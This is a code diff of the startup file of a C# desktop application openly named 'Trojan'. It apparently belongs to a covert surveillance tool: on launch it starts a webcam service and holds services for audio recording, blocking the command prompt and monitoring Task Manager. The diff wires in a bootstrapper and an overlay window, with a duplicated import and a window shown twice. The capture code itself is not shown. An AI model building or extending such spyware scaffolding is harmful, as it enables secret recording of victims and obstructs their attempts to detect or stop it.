@@ -1,8 +1,12 @@
 ﻿using System.Windows;
-using Trojan.DataBase;
+// using Trojan.DataBase;
 using Trojan.Views;
 using Trojan.Services;
 using System.Windows.Input;
+using Trojan.Data.DataBase;
+using Trojan.Data.Seeders;
+using Trojan.UI.Views.Pages;
+using Trojan.Services;
 
 namespace Trojan
 {
@@ -16,8 +20,9 @@ namespace Trojan
         private AudioRecorderService _audioRecorder;
         private CmdBlockerService _cmdBlockerService;
         private TaskManagerMonitorService _taskManagerMonitorService;
+        
         public static bool _devMode { get; private set; }
-
+        
         protected override async void OnStartup(StartupEventArgs e)
         {
             base.OnStartup(e);
@@ -38,6 +43,11 @@ namespace Trojan
                 db.Database.EnsureCreated();
             }
 
+            new AppBootstrapper().Run();
+
+            var mainWindow = new HelperOverlayWindow();
+            MainWindow = mainWindow;
+            mainWindow.Show();
             _webcamService = new WebcamService();
             _webcamService.Start();
 
@@ -55,7 +65,7 @@ namespace Trojan
             MainWindow = helperOverlayWindow;
             helperOverlayWindow.Show();
 
-            
+        
         }
 
         protected override void OnExit(ExitEventArgs e)
